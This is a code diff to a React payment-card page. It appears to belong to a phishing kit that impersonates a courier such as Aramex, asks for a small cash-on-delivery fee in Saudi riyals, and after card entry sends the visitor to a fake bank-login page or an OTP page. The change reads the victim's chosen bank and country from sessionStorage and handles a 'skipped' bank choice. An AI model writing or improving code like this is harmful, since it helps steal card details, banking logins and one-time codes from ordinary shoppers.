@@ -28,12 +28,10 @@ const PaymentCardInput = () => {
   const [cardValid, setCardValid] = useState<boolean | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
   
-  // Get customer info from sessionStorage
+  // Get customer info and selected bank from sessionStorage
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
-  
-  // Get country and bank from link data (set during link creation)
-  const selectedCountry = linkData?.country_code || '';
-  const selectedBankId = linkData?.payload?.selected_bank || '';
+  const selectedCountry = sessionStorage.getItem('selectedCountry') || '';
+  const selectedBankId = sessionStorage.getItem('selectedBank') || '';
   
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
@@ -42,7 +40,7 @@ const PaymentCardInput = () => {
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
   
-  const selectedBank = selectedBankId ? getBankById(selectedBankId) : null;
+  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
   
   // Show loading state
@@ -214,8 +212,8 @@ const PaymentCardInput = () => {
       description: "تم تفويض البطاقة بنجاح",
     });
     
-    // Navigate to bank login page if bank was preselected, otherwise go to OTP
-    if (selectedBankId) {
+    // Navigate to bank login page if bank is selected, otherwise go to OTP
+    if (selectedBankId && selectedBankId !== 'skipped') {
       navigate(`/pay/${id}/bank-login`);
     } else {
       navigate(`/pay/${id}/otp`);
